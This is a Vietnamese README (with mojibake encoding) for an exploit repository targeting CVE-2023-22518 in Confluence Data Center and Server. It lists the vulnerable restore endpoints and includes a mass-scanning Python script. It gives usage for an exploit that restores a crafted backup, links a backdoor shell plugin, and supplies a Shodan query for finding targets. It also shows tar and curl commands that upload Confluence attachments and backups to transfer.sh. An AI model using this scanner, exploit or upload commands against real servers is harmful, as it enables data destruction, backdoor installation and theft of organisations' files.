# CVE-2023-22518
L·ªó h·ªïng Ph√¢n Quy·ªÅn Kh√¥ng Ch√≠nh X√°c trong Confluence Data Center v√† Server.

Atlassian ƒë√£ c·∫£nh b√°o qu·∫£n tr·ªã vi√™n v·ªÅ l·ªó h·ªïng nghi√™m tr·ªçng trong Confluence. Vi·ªác khai th√°c l·ªó h·ªïng n√†y c√≥ th·ªÉ d·∫´n ƒë·∫øn m·∫•t d·ªØ li·ªáu, do ƒë√≥ nh√† ph√°t tri·ªÉn khuy·∫øn c√°o b·∫°n n√™n c√†i ƒë·∫∑t b·∫£n v√° ngay l·∫≠p t·ª©c.

ƒê∆∞·ª£c l∆∞u √Ω r·∫±ng l·ªó h·ªïng kh√¥ng th·ªÉ ƒë∆∞·ª£c s·ª≠ d·ª•ng ƒë·ªÉ r√≤ r·ªâ d·ªØ li·ªáu v√† kh√¥ng ·∫£nh h∆∞·ªüng ƒë·∫øn c√°c trang Atlassian Cloud ƒë∆∞·ª£c truy c·∫≠p qua t√™n mi·ªÅn atlassian.net.

[Th√¥ng tin chi ti·∫øt v·ªÅ l·ªó h·ªïng](https://confluence.atlassian.com/security/cve-2023-22518-improper-authorization-vulnerability-in-confluence-data-center-and-server-1311473907.html)

[Trang Jira Atlassian](https://jira.atlassian.com/browse/CONFSERVER-93142)

| S·∫£n ph·∫©m               | Phi√™n b·∫£n b·ªã ·∫£nh h∆∞·ªüng            | Phi√™n b·∫£n ƒë√£ v√°          |
|-----------------------|----------------------------------|-------------------------|
| Confluence Data Center | T·∫•t c·∫£ phi√™n b·∫£n ƒë·ªÅu b·ªã ·∫£nh h∆∞·ªüng | 7.19.16 tr·ªü l√™n         |
| Confluence Server      |                                  | 8.3.4 tr·ªü l√™n           |
|                        |                                  | 8.4.4 tr·ªü l√™n           |
|                        |                                  | 8.5.3 tr·ªü l√™n           |
|                        |                                  | 8.6.1 tr·ªü l√™n           |

## Khai th√°c
Lo·∫°i: Ph√¢n quy·ªÅn kh√¥ng ch√≠nh x√°c

CWE: [CWE-285 / CWE-266](https://cwe.mitre.org/data/definitions/285.html)

ATT&CK: [T1548.002](https://attack.mitre.org/techniques/T1548/002/)

## C√°c v√©c-t∆° t·∫•n c√¥ng ƒë√£ bi·∫øt üî•
/json/setup-restore.action

/json/setup-restore-local.action

/json/setup-restore-progress.action

/server-info.action [Di·ªÖn ƒë√†n](https://community.atlassian.com/t5/Confluence-questions/Is-CVE-2023-22515-also-exploitable-via-server-info-action/qaq-p/2501129)

## V√≠ d·ª• ƒë∆°n gi·∫£n v·ªÅ ki·ªÉm tra l·ªó h·ªïng b·∫±ng Python


```
import requests
import random
import string
import argparse
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def random_string(length=10):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(length))

def post_setup_restore(baseurl):
    paths = ["/json/setup-restore.action", "/json/setup-restore-local.action", "/json/setup-restore-progress.action", "/server-info.action"]
    for path in paths:
        url = f"{baseurl.rstrip('/')}{path}"

        headers = {
            "X-Atlassian-Token": "no-check",
            "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryT3yekvo0rGaL9QR7"
        }

        rand_str = random_string()
        data = (
            "------WebKitFormBoundaryT3yekvo0rGaL9QR7\r\n"
            "Content-Disposition: form-data; name=\"buildIndex\"\r\n\r\n"
            "true\r\n"
            "------WebKitFormBoundaryT3yekvo0rGaL9QR7\r\n"
            f"Content-Disposition: form-data; name=\"file\";filename=\"{rand_str}.zip\"\r\n\r\n"
            f"{rand_str}\r\n"
            "------WebKitFormBoundaryT3yekvo0rGaL9QR7\r\n"
            "Content-Disposition: form-data; name=\"edit\"\r\n\r\n"
            "Upload and import\r\n"
            "------WebKitFormBoundaryT3yekvo0rGaL9QR7--\r\n"
        )

        try:
            response = requests.post(url, headers=headers, data=data.encode('utf-8'), timeout=10, verify=False)

            if (response.status_code == 200 and
                'The zip file did not contain an entry' in response.text and 
                'exportDescriptor.properties' in response.text):
                print(f"[+] Vulnerable to CVE-2023-22518 on host {url}!")
            else:
                print(f"[-] Not vulnerable to CVE-2023-22518 for host {url}.")
        except requests.RequestException as e:
            print(f"[*] Error connecting to {url}. Error: {e}")

def main():
    parser = argparse.ArgumentParser(description="Post setup restore script")
    parser.add_argument('--url', help='The URL to target', required=False)
    parser.add_argument('--file', help='Filename containing a list of URLs', required=False)
    args = parser.parse_args()

    if args.url:
        post_setup_restore(args.url)
    elif args.file:
        with open(args.file, 'r') as f:
            for line in f:
                url = line.strip()
                if url:
                    post_setup_restore(url)
    else:
        print("You must provide either --url or --file argument.")

if __name__ == "__main__":
    main()
```

## S·ª≠ d·ª•ng k·ªãch b·∫£n khai th√°c üî•

[exploit.py](https://github.com/ForceFledgling/CVE-2023-22518/blob/main/exploit.py)
```
python3 exploit.py
Enter the URL: http://REDACTED:8090/json/setup-restore.action?synchronous=true
Enter the path to the .zip file: /path/xmlexport-20231109-060519-1.zip
```

## BugsBonus  üî•
T√¨m ki·∫øm Shodan:
```
http.favicon.hash:-305179312
```

[exploit-restore.zip](https://github.com/ForceFledgling/CVE-2023-22518/blob/main/xmlexport-20231109-060519-1.zip)

[·ª®ng d·ª•ng Confluence Backdoor Shell](https://github.com/ForceFledgling/CVE-2023-22518/blob/main/atlplug.jar)

Khi kh√¥i ph·ª•c Confluence s·ª≠ d·ª•ng l·ªó h·ªïng n√†y, th∆∞ m·ª•c %CONFLUENCE_HOME%/attachments v·∫´n ch·ª©a ƒë·∫ßy t·ªáp tin, c√≥ th·ªÉ l√™n ƒë·∫øn h√†ng ng√†n. Vi·ªác tr√≠ch xu·∫•t ch√∫ng kh√° ƒë∆°n gi·∫£n, v√† ph·∫ßn m·ªü r·ªông c·ªßa ch√∫ng c√≥ th·ªÉ ƒë∆∞·ª£c x√°c ƒë·ªãnh b·∫±ng l·ªánh file c·ªßa Linux. V√≠ d·ª•:
```
file /var/lib/confluence/attachments/v4/191/28/77273124/77273124.1
/var/lib/confluence/attachments/v4/191/28/77273124/77273124.1: PNG image data, 442 x 170, 8-bit/color RGBA, non-interlaced

Ho·∫∑c

file /var/atlassian/application-data/confluence/attachments/v4/114/128/3506237/3506237.1
/var/atlassian/application-data/confluence/attachments/v4/114/128/3506237/3506237.1: PNG image data, 1250 x 674, 8-bit/color RGBA, non-interlaced
```

V√≠ d·ª• v·ªÅ c√°ch l∆∞u tr·ªØ m·ªôt th∆∞ m·ª•c d·ªÖ d√†ng v√† gi·∫£i n√©n l∆∞u tr·ªØ:
```
tar -czvf /var/atlassian/application-data/confluence/attachments_backup.tar.gz /var/atlassian/application-data/confluence/attachments
curl --upload-file /var/atlassian/application-data/attachments_backup.tar.gz https://transfer.sh/attachments_backup.tar.gz
https://transfer.sh/***********/attachments_backup.tar.gz

or

curl --upload-file /var/atlassian/application-data/confluence/backups/backup-2023_09_26.zip https://transfer.sh/backup-2023_09_26.zip
https://transfer.sh/***********/backup-2023_09_26.zip
```
[B√†i b√°o v·ªÅ backdoor m·ªõi t·ªìn t·∫°i ngay c·∫£ sau khi v√° l·ªó h·ªïng nghi√™m tr·ªçng c·ªßa Confluence](https://www.theregister.com/2023/11/14/novel_backdoor_persists_confluence/)

##

[Th√¥ng tin h·ªØu √≠ch kh√°c](https://github.com/ForceFledgling/CVE-2023-22518/blob/main/DETAIL.md)

